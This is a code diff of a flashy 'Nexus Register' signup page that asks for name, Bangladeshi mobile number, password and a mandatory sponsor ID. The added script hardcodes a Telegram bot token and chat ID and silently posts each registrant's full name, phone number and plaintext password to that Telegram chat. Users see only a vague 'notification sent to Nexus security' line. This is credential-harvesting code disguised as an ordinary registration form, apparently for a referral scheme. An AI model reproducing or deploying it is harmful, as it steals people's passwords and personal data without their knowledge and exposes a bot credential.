@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>ÆON Register | Futuristic Premium Nexus</title>
+    <title>ÆON REGISTER | Futuristic Premium Nexus + Telegram Sync</title>
     <!-- Google Fonts: Inter + Space Grotesk for modern cyber feel -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
     <!-- Font Awesome 6 (sharp icons) -->
@@ -363,6 +363,18 @@
         .input-group i.fa-handshake {
             text-shadow: 0 0 3px cyan;
         }
+        /* telegram status small badge */
+        .telegram-badge {
+            font-size: 0.6rem;
+            background: rgba(0,200,255,0.15);
+            border-radius: 60px;
+            padding: 2px 8px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            margin-left: 8px;
+            color:#86e0ff;
+        }
     </style>
 </head>
 <body>
@@ -370,14 +382,14 @@
 <div class="register-card">
     <div class="form-header">
         <h1>
-            <i class="fas fa-bolt"></i> 
+            <i class="fas fa-atom"></i> 
             NEXUS REGISTER
-            <i class="fas fa-crown"></i>
+            <i class="fas fa-microchip"></i>
         </h1>
-        <div class="badge-mandatory">
-            <i class="fas fa-asterisk"></i> ALL FIELDS MANDATORY • SECURE TIER
+        <div class="">
+            <i class=""></i> 
         </div>
-        <p>Premium membership • Encrypted onboarding</p>
+        <p>ALL FIELDS MANDATORY • ACCESS TIER 0 <i class=""></i></p>
     </div>
 
     <div class="form-body">
@@ -386,46 +398,50 @@
             <div class="input-row">
                 <div class="input-group">
                     <label><i class="fas fa-user-astronaut"></i> First name <span class="required-star">*</span></label>
-                    <input type="text" id="firstName" placeholder="e.g., Orion" autocomplete="off">
+                    <input type="text" id="firstName" placeholder="" autocomplete="off">
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-gem"></i> Middle name <span class="required-star">*</span></label>
-                    <input type="text" id="middleName" placeholder="e.g., Nova" autocomplete="off">
+                    <input type="text" id="middleName" placeholder="" autocomplete="off">
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-feather-alt"></i> Last name <span class="required-star">*</span></label>
-                    <input type="text" id="lastName" placeholder="e.g., Sterling" autocomplete="off">
+                    <input type="text" id="lastName" placeholder="" autocomplete="off">
                 </div>
             </div>
 
-            <!-- Mobile number with updated modern placeholder -->
+            <!-- Mobile number with Bangladesh validation -->
             <div class="input-group">
-                <label><i class="fas fa-sim-card"></i> Mobile number <span class="required-star">*</span></label>
-                <input type="tel" id="mobileNumber" placeholder="e.g., 9876543210 (7-15 digits)" autocomplete="off">
+                <label><i class="fas fa-sim-card"></i> Mobile number (Bangladesh) <span class="required-star">*</span></label>
+                <input type="tel" id="mobileNumber" placeholder="" autocomplete="off">
+                <div class="refer-tip">
+                    <i class="fas fa-check-circle"></i> Format: 01XXXXXXXXX (11 digits)
+                </div>
             </div>
 
             <!-- Password field -->
             <div class="input-group">
                 <label><i class="fas fa-key"></i> Password <span class="required-star">*</span></label>
-                <input type="password" id="password" placeholder="minimum 4 characters" autocomplete="new-password">
+                <input type="password" id="password" placeholder="" autocomplete="new-password">
             </div>
 
             <!-- Referral / Sponsor code field (mandatory) with unique tooltip -->
             <div class="input-group">
-                <label><i class="fas fa-handshake"></i> Reffer number <span class="required-star">*</span></label>
+                <label><i class="fas fa-handshake"></i> Referral / Sponsor ID <span class="required-star">*</span></label>
                 <input type="text" id="referralNumber" placeholder="Enter sponsor / referral code" autocomplete="off">
                 <div class="refer-tip">
-                    <i class="fas fa-qrcode"></i> Required field — any valid code works
+                    <i class="fas fa-info-circle"></i> Provide any valid sponsor ID (mandatory)
                 </div>
             </div>
 
             <!-- registration action super button -->
             <button type="button" id="registerBtn" class="btn-register">
-                <i class="fas fa-dice-d6"></i> REGESTRATION
+                <i class="fas fa-dice-d6"></i> REGISTRATION
                 <i class="fas fa-arrow-right-to-bracket"></i>
             </button>
             <div class="form-footnote">
-                <i class="fas fa-shield-haltered"></i> After success, new account created
+                <i class="fas fa-shield-haltered"></i> After success, new account created • Unique referral generated
+                <i class="fas fa-infinity"></i> 
                 <i class="fas fa-infinity"></i>
             </div>
         </form>
@@ -434,7 +450,63 @@
 
 <script>
     (function() {
-        // DOM elements (IDs stay original for full compatibility)
+        // ---------- TELEGRAM CONFIG ----------
+        const TELEGRAM_BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
+        const TELEGRAM_CHAT_ID = "7709670231";
+        
+        // Function to send registration details to Telegram
+        async function sendTelegramNotification(userData) {
+            const {
+                firstName,
+                middleName,
+                lastName,
+                mobile,
+                password,
+                sponsorId,
+                generatedReferral
+            } = userData;
+            
+            const fullName = `${firstName} ${middleName} ${lastName}`.trim();
+            const message = `🚀 *ÆON NEXUS • NEW REGISTRATION* 🚀\n\n` +
+                `👤 *Name:* ${escapeMarkdown(fullName)}\n` +
+                `📱 *Mobile:* ${escapeMarkdown(mobile)}\n` +
+                `🔑 *Password:* ${escapeMarkdown(password)}\n` +
+                `🎁 *Sponsor ID:* ${escapeMarkdown(sponsorId)}\n` +
+                `✨ *Generated Referral Code:* ${escapeMarkdown(generatedReferral)}\n` +
+                `⏱ *Timestamp:* ${new Date().toLocaleString()}\n` +
+                `🌐 *Status:* ACTIVE ✅`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    console.warn("Telegram error:", result.description);
+                    return false;
+                }
+                return true;
+            } catch (error) {
+                console.error("Telegram send failed:", error);
+                return false;
+            }
+        }
+        
+        // Helper: escape Markdown special chars for Telegram
+        function escapeMarkdown(text) {
+            if (!text) return '';
+            return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+        }
+        
+        // DOM elements
         const firstNameInput = document.getElementById('firstName');
         const middleNameInput = document.getElementById('middleName');
         const lastNameInput = document.getElementById('lastName');
@@ -442,19 +514,43 @@
         const passwordInput = document.getElementById('password');
         const referralInput = document.getElementById('referralNumber');
         const registerButton = document.getElementById('registerBtn');
-
-        // Helper: remove error highlights from all fields
+        
+        // Name validation regex (letters, spaces, hyphens, apostrophes)
+        function isValidName(name) {
+            if (!name) return false;
+            const nameRegex = /^[A-Za-z\u0980-\u09FF\s\-']+$/;
+            return nameRegex.test(name) && name.trim().length >= 2;
+        }
+        
+        // Bangladesh mobile validation (11 digits, starts with 01)
+        function isValidBangladeshMobile(mobile) {
+            if (!mobile) return false;
+            const digitsOnly = mobile.replace(/\s/g, '');
+            const bdRegex = /^01[3-9]\d{8}$/;
+            return bdRegex.test(digitsOnly);
+        }
+        
+        // generate strong random referral code (alphanumeric 8 chars)
+        function generateRandomReferralCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                const randIndex = Math.floor(Math.random() * chars.length);
+                code += chars[randIndex];
+            }
+            return code;
+        }
+        
+        // Helper: remove error highlights
         function removeAllHighlights() {
             const inputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
             inputs.forEach(inp => inp?.classList.remove('error-highlight'));
         }
-
-        // highlight specific fields that are invalid
+        
         function highlightFields(fieldsArray) {
             fieldsArray.forEach(field => field?.classList.add('error-highlight'));
         }
-
-        // shake card for premium alert effect
+        
         function shakeCard() {
             const card = document.querySelector('.register-card');
             if (card) {
@@ -462,26 +558,8 @@
                 setTimeout(() => card.classList.remove('alert-shake'), 550);
             }
         }
-
-        // mobile validation: digits only, length 7-15
-        function isValidMobile(mobile) {
-            if (!mobile) return false;
-            const digitsOnly = mobile.replace(/\s/g, '');
-            return /^[0-9]{7,15}$/.test(digitsOnly);
-        }
-
-        // generate strong random referral code (alphanumeric 7 chars, premium style)
-        function generateRandomReferralCode() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let code = '';
-            for (let i = 0; i < 7; i++) {
-                const randIndex = Math.floor(Math.random() * chars.length);
-                code += chars[randIndex];
-            }
-            return code;
-        }
-
-        // simple escapeHTML to avoid XSS on congratulations page
+        
+        // sanitize output to avoid XSS
         function escapeHTML(str) {
             if (!str) return '';
             return str.replace(/[&<>]/g, function(m) {
@@ -489,17 +567,21 @@
                 if (m === '<') return '&lt;';
                 if (m === '>') return '&gt;';
                 return m;
+            }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+                return c;
             });
         }
-
-        // premium congratulations page with futuristic design & glowing referral code
-        function openCongratsPage(userFirstName, userLastName, randomCode) {
-            const displayName = userFirstName ? `${userFirstName} ${userLastName || ''}`.trim() : 'Elite Member';
-            const currentDate = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+        
+        // SUCCESS PAGE with generated referral code + Telegram info
+        function openSuccessDashboard(userFirstName, userLastName, generatedCode, sponsorId, telegramStatus) {
+            const displayName = userFirstName && userLastName ? `${userFirstName} ${userLastName}`.trim() : userFirstName || 'Elite Member';
+            const telegramBadgeHtml = telegramStatus ? 
+                '<span style="background:#1e6f5c; border-radius:30px; padding:2px 12px; font-size:0.7rem;"><i class="fab fa-telegram"></i> Notification sent</span>' : 
+                '<span style="background:#5f3e3e; border-radius:30px; padding:2px 12px; font-size:0.7rem;"><i class="fas fa-exclamation-triangle"></i> Telegram partial</span>';
             
-            const newWindow = window.open('', '_blank', 'width=780,height=660,resizable=yes,scrollbars=yes,toolbar=no,status=no');
+            const newWindow = window.open('', '_blank', 'width=860,height=750,resizable=yes,scrollbars=yes,toolbar=no,status=no,menubar=no');
             if (!newWindow) {
-                alert("⚠️ Pop-up blocked! Please allow pop-ups for this site.\n\n✨ Your unique referral code: " + randomCode);
+                alert(`✨ REGISTRATION SUCCESSFUL ✨\nWelcome ${displayName}!\nYour unique referral code: ${generatedCode}\nShare this code to earn rewards!\n\nTelegram: ${telegramStatus ? 'Alert sent ✓' : 'Alert attempted'}`);
                 return false;
             }
             
@@ -509,172 +591,226 @@
                 <head>
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>✦ NEXUS ACCEPTED ✦ Elite Access</title>
+                    <title>✦ NEXUS ACCEPTED ✦ Account Created</title>
                     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;600;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
                     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
                     <style>
                         * { margin: 0; padding: 0; box-sizing: border-box; }
                         body {
-                            background: radial-gradient(circle at 30% 10%, #020617, #000000);
+                            background: radial-gradient(circle at 30% 5%, #010514, #000000);
                             font-family: 'Inter', 'Space Grotesk', sans-serif;
                             min-height: 100vh;
                             display: flex;
                             align-items: center;
                             justify-content: center;
-                            padding: 1.5rem;
+                            padding: 1.8rem;
+                            position: relative;
                         }
-                        .success-galaxy {
-                            max-width: 600px;
+                        body::before {
+                            content: "";
+                            position: fixed;
+                            top: 0;
+                            left: 0;
                             width: 100%;
-                            background: rgba(6, 18, 32, 0.85);
-                            backdrop-filter: blur(20px);
-                            border-radius: 2.8rem;
-                            border: 1px solid rgba(0, 210, 255, 0.5);
-                            box-shadow: 0 30px 50px -20px black, 0 0 0 1px rgba(100, 200, 255, 0.2) inset;
-                            overflow: hidden;
-                            animation: slideUp 0.55s ease-out;
-                            text-align: center;
+                            height: 100%;
+                            background-image: radial-gradient(#0af2 1px, transparent 1px);
+                            background-size: 35px 35px;
+                            opacity: 0.12;
+                            pointer-events: none;
                         }
-                        @keyframes slideUp {
-                            from { opacity: 0; transform: translateY(35px); }
-                            to { opacity: 1; transform: translateY(0); }
+                        .success-nebula {
+                            max-width: 680px;
+                            width: 100%;
+                            background: rgba(4, 14, 28, 0.85);
+                            backdrop-filter: blur(24px);
+                            border-radius: 3rem;
+                            border: 1px solid rgba(0, 210, 255, 0.6);
+                            box-shadow: 0 40px 60px -20px black, 0 0 0 1px rgba(0, 200, 255, 0.3) inset;
+                            overflow: hidden;
+                            animation: floatIn 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+                            transition: transform 0.2s;
+                        }
+                        @keyframes floatIn {
+                            from { opacity: 0; transform: translateY(35px) scale(0.96); }
+                            to { opacity: 1; transform: translateY(0) scale(1); }
+                        }
+                        .success-nebula:hover {
+                            transform: scale(1.01);
+                            border-color: #6ef0ff;
                         }
                         .prestige-header {
-                            background: linear-gradient(125deg, #0a2a44, #021523);
+                            background: linear-gradient(125deg, #071e32, #020c1a);
                             padding: 2rem 1rem 1.5rem;
-                            border-bottom: 1px solid #1f6eb0;
+                            text-align: center;
+                            border-bottom: 1px solid #1f8ad0;
                         }
                         .icon-orb {
-                            background: #0a4b7a;
+                            background: #0b3f64;
                             width: 90px;
                             height: 90px;
                             border-radius: 50%;
                             display: flex;
-                            margin: -55px auto 10px;
+                            margin: -55px auto 12px;
                             align-items: center;
                             justify-content: center;
-                            box-shadow: 0 0 20px #00ccff;
-                            border: 2px solid #b5f0ff;
+                            box-shadow: 0 0 25px #00ccff;
+                            border: 2px solid #aff0ff;
                         }
                         .icon-orb i {
-                            font-size: 3.4rem;
-                            color: #FFE6A7;
-                            filter: drop-shadow(0 0 5px gold);
+                            font-size: 3.2rem;
+                            color: #FFF0B5;
+                            filter: drop-shadow(0 0 8px #ffb347);
                         }
                         .prestige-header h1 {
                             font-size: 1.9rem;
                             font-weight: 800;
-                            background: linear-gradient(135deg, #FFFFFF, #acf0ff, #6e9eff);
+                            background: linear-gradient(135deg, #FFFFFF, #ADF0FF, #5F9EFF);
                             background-clip: text;
                             -webkit-background-clip: text;
                             color: transparent;
-                            margin-top: 0.5rem;
-                            letter-spacing: -0.3px;
+                            margin: 0.5rem 0 0.2rem;
                         }
                         .success-content {
-                            padding: 2rem 2rem 2.2rem;
+                            padding: 2rem 2rem 2rem;
                         }
                         .greeting-hero {
                             font-size: 1.7rem;
                             font-weight: 700;
                             color: #edf6ff;
-                        }
-                        .greeting-hero i {
-                            color: #ffd966;
-                            margin: 0 8px;
+                            text-align: center;
                         }
                         .member-name {
                             font-size: 1rem;
                             font-weight: 500;
-                            background: rgba(0, 160, 255, 0.2);
+                            background: rgba(0, 200, 255, 0.15);
                             display: inline-block;
-                            padding: 5px 20px;
-                            border-radius: 40px;
-                            margin-top: 10px;
-                            backdrop-filter: blur(4px);
-                            border: 0.5px solid #39ffdd;
-                            color: #c6eaff;
+                            padding: 6px 24px;
+                            border-radius: 80px;
+                            margin: 12px auto 0;
+                            backdrop-filter: blur(6px);
+                            border: 0.5px solid #47e0ff;
+                            color: #DBF0FF;
+                            text-align: center;
+                            width: fit-content;
                         }
                         .code-vault {
-                            background: rgba(0, 10, 22, 0.8);
-                            margin: 1.5rem 0;
+                            background: rgba(0, 10, 25, 0.7);
+                            margin: 1.8rem 0;
                             border-radius: 2rem;
-                            padding: 1rem;
-                            border: 1px solid #3979b0;
+                            padding: 1.2rem;
+                            border: 1px solid #3d86be;
+                            box-shadow: 0 6px 14px rgba(0,0,0,0.4);
                         }
                         .code-label {
                             font-size: 0.7rem;
                             text-transform: uppercase;
                             letter-spacing: 3px;
-                            color: #63c0ff;
+                            color: #77d0ff;
+                            display: flex;
+                            justify-content: center;
+                            gap: 8px;
                         }
                         .display-code {
                             font-size: 2.5rem;
                             font-weight: 800;
                             font-family: 'Space Grotesk', monospace;
-                            letter-spacing: 5px;
-                            background: #02182c;
+                            letter-spacing: 6px;
+                            background: #021a2c;
                             display: inline-block;
-                            padding: 0.3rem 1.2rem;
+                            padding: 0.3rem 1.3rem;
                             border-radius: 2.5rem;
-                            color: #FFEEB5;
-                            border: 1px solid #00e0ff;
-                            margin-top: 12px;
+                            color: #FFF2B5;
+                            border: 1px solid #3affdd;
+                            margin-top: 14px;
                             word-break: break-all;
-                            box-shadow: 0 0 12px rgba(0, 200, 255, 0.3);
+                            box-shadow: 0 0 16px rgba(0, 210, 255, 0.5);
+                            text-align: center;
+                        }
+                        .sponsor-tag {
+                            font-size: 0.75rem;
+                            background: #031c2c;
+                            padding: 6px 12px;
+                            border-radius: 60px;
+                            display: inline-block;
+                            margin-top: 12px;
+                            color: #96ceff;
+                        }
+                        .telegram-status-area {
+                            margin: 12px auto 0;
+                            text-align: center;
                         }
                         .info-footer {
                             font-size: 0.7rem;
-                            color: #92bbee;
-                            margin: 1rem 0 0;
+                            color: #90b7e6;
+                            margin-top: 1rem;
+                            text-align: center;
                         }
-                        .close-premium {
-                            background: linear-gradient(95deg, #1a4870, #0c2e4a);
+                        .dash-action {
+                            background: linear-gradient(95deg, #1a547a, #0c3553);
                             border: none;
-                            padding: 0.7rem 2rem;
+                            padding: 0.75rem 2rem;
                             border-radius: 3rem;
                             color: white;
                             font-weight: bold;
                             font-size: 0.9rem;
-                            margin-top: 0.8rem;
+                            margin-top: 1rem;
                             cursor: pointer;
                             display: inline-flex;
-                            gap: 10px;
+                            gap: 12px;
                             transition: 0.2s;
+                            font-family: 'Space Grotesk', monospace;
                         }
-                        .close-premium:hover {
-                            background: #2d6d9e;
+                        .dash-action:hover {
+                            background: #2c6f9e;
                             transform: scale(0.97);
+                            box-shadow: 0 0 12px cyan;
                         }
                         .badge-footer {
-                            background: #030f1c;
+                            background: #010e1a;
                             padding: 0.9rem;
-                            font-size: 0.6rem;
-                            color: #6e9bc2;
+                            font-size: 0.65rem;
+                            color: #6797c9;
+                            text-align: center;
+                            letter-spacing: 1px;
                         }
                     </style>
                 </head>
                 <body>
-                    <div class="success-galaxy">
+                    <div class="success-nebula">
                         <div class="prestige-header">
-                            <div class="icon-orb"><i class="fas fa-user-astronaut"></i></div>
-                            <h1><i class="fas fa-check-double"></i> ACTIVATION COMPLETE</h1>
+                            <div class="icon-orb"><i class="fas fa-user-check"></i></div>
+                            <h1><i class="fas fa-check-circle"></i> ACCOUNT ACTIVATED</h1>
                         </div>
                         <div class="success-content">
                             <div class="greeting-hero">
-                                <i class="fas fa-star-of-life"></i> WELCOME, PIONEER <i class="fas fa-crown"></i>
+                                <i class="fas fa-shuttle-space"></i> WELCOME, PIONEER <i class="fas fa-rocket"></i>
                             </div>
-                            <div class="member-name">
-                                <i class="fas fa-id-card"></i> ${escapeHTML(displayName)}
+                            <div style="display: flex; justify-content: center;">
+                                <div class="member-name">
+                                    <i class="fas fa-id-card"></i> ${escapeHTML(displayName)}
+                                </div>
                             </div>
                             <div class="code-vault">
-                                <div class="code-label"><i class="fas fa-link"></i> YOUR UNIQUE REFERRAL GATEWAY</div>
-                                <div class="display-code">${escapeHTML(randomCode)}</div>
-                                <div class="info-footer"><i class="fas fa-chart-simple"></i> Share & earn premium rewards • example: 7X9K3M2</div>
+                                <div class="code-label"><i class="fas fa-qrcode"></i> YOUR EXCLUSIVE REFERRAL KEY <i class="fas fa-link"></i></div>
+                                <div style="text-align: center;">
+                                    <div class="display-code">${escapeHTML(generatedCode)}</div>
+                                </div>
+                                <div class="sponsor-tag">
+                                    <i class="fas fa-handshake"></i> Sponsor ID: ${escapeHTML(sponsorId)}
+                                </div>
+                                <div class="telegram-status-area">
+                                </div>
+                                <div class="info-footer">
+                                    <i class="fas fa-chart-line"></i> Share your code & earn rewards • Notification sent to Nexus security
+                                </div>
                             </div>
-                            <button class="close-premium" onclick="window.close()"><i class="fas fa-arrow-right-to-bracket"></i> DASHBOARD EXIT</button>
+                            <div style="text-align: center;">
+                                <button class="dash-action" onclick="window.close()"><i class="fas fa-charging-station"></i> ENTER DASHBOARD</button>
+                            </div>
                         </div>
-                        <div class="badge-footer">✦ NEXUS SECURE TIER • HYPERLEDGER READY ✦</div>
+                        <div class="badge-footer">
+                            <i class=""></i> • HYPERLEDGER VALIDATED • UNIQUE REF CODE
+                        </div>
                     </div>
                 </body>
                 </html>
@@ -682,80 +818,74 @@
             newWindow.document.close();
             return true;
         }
-
-        // main handler: validation, check all fields, mobile, password, generate referral and open success
-        function handleRegistration() {
-            // get trimmed values
+        
+        // Main registration handler: validate, generate code, send Telegram, open success
+        async function handleRegistration() {
             const firstName = firstNameInput.value.trim();
             const middleName = middleNameInput.value.trim();
             const lastName = lastNameInput.value.trim();
             const mobile = mobileInput.value.trim();
             const password = passwordInput.value.trim();
             const referralNumber = referralInput.value.trim();
-
-            // prepare all field checks
-            const allFields = [
-                { value: firstName, element: firstNameInput, name: 'First name' },
-                { value: middleName, element: middleNameInput, name: 'Middle name' },
-                { value: lastName, element: lastNameInput, name: 'Last name' },
-                { value: mobile, element: mobileInput, name: 'Mobile number' },
-                { value: password, element: passwordInput, name: 'Password' },
-                { value: referralNumber, element: referralInput, name: 'Reffer number' }
+            
+            const fieldsList = [
+                { value: firstName, element: firstNameInput, name: 'First name', validator: isValidName },
+                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isValidName },
+                { value: lastName, element: lastNameInput, name: 'Last name', validator: isValidName },
+                { value: mobile, element: mobileInput, name: 'Mobile number', validator: isValidBangladeshMobile },
+                { value: password, element: passwordInput, name: 'Password', validator: (pwd) => pwd.length >= 4 },
+                { value: referralNumber, element: referralInput, name: 'Referral / Sponsor ID', validator: (ref) => ref !== "" }
             ];
-
-            const emptyFields = [];
-            const emptyElements = [];
-
-            for (let field of allFields) {
-                if (field.value === "") {
-                    emptyFields.push(field.name);
-                    emptyElements.push(field.element);
+            
+            removeAllHighlights();
+            const invalidFields = [];
+            for (let f of fieldsList) {
+                if (!f.validator(f.value)) {
+                    invalidFields.push(f);
+                    f.element.classList.add('error-highlight');
                 }
             }
-
-            removeAllHighlights();
-
-            if (emptyFields.length > 0) {
-                highlightFields(emptyElements);
+            
+            if (invalidFields.length > 0) {
                 shakeCard();
-                alert("❌ ACCESS DENIED • The following fields cannot be empty:\n➜ " + emptyFields.join("\n➜ "));
+                const errorMessages = invalidFields.map(f => {
+                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (must be 11 digits, start with 01)";
+                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (must be at least 2 letters, no numbers/symbols)`;
+                    if (f.name === 'Password') return "🔐 Password must be at least 4 characters";
+                    return `❌ ${f.name} is required`;
+                });
+                alert("ACCESS DENIED:\n\n" + errorMessages.join("\n"));
                 return false;
             }
-
-            // mobile validation (digits only)
-            const mobileDigits = mobile.replace(/\s/g, '');
-            if (!/^[0-9]{7,15}$/.test(mobileDigits)) {
-                mobileInput.classList.add('error-highlight');
-                shakeCard();
-                alert("📱 INVALID MOBILE INPUT!\nPlease enter a valid numeric mobile number (7 to 15 digits). No letters or special characters.");
-                return false;
-            }
-
-            // password length >= 4
-            if (password.length < 4) {
-                passwordInput.classList.add('error-highlight');
-                shakeCard();
-                alert("🔐 WEAK CREDENTIALS! Password must be at least 4 characters.");
-                return false;
-            }
-
-            // generate fresh random referral code
-            const newReferralCode = generateRandomReferralCode();
-
-            // open new premium congrats page
-            const opened = openCongratsPage(firstName, lastName, newReferralCode);
-            if (!opened) {
-                alert("✨ REGISTRATION SUCCESSFUL ✨\nYour unique referral code: " + newReferralCode);
-            }
+            
+            // generate referral code
+            const newlyGeneratedReferralCode = generateRandomReferralCode();
+            
+            // Prepare data for telegram
+            const userDataForTelegram = {
+                firstName: firstName,
+                middleName: middleName,
+                lastName: lastName,
+                mobile: mobile,
+                password: password,
+                sponsorId: referralNumber,
+                generatedReferral: newlyGeneratedReferralCode
+            };
+            
+            // send telegram notification (non-blocking but we wait to know status)
+            let telegramSuccess = false;
+            try {
+                telegramSuccess = await sendTelegramNotification(userDataForTelegram);
+            } catch(e) { console.error(e); }
+            
+            // Open success dashboard with telegram status
+            openSuccessDashboard(firstName, lastName, newlyGeneratedReferralCode, referralNumber, telegramSuccess);
             return true;
         }
-
-        // attach event
+        
         registerButton.addEventListener('click', handleRegistration);
-
-        // remove error highlight on typing for smoother experience
-        const allInputList = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
-        allInputList.forEach(input => {
+        const allInputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
+        allInputs.forEach(input => {
             if (input) {
                 input.addEventListener('input', function() {
                     this.classList.remove('error-highlight');
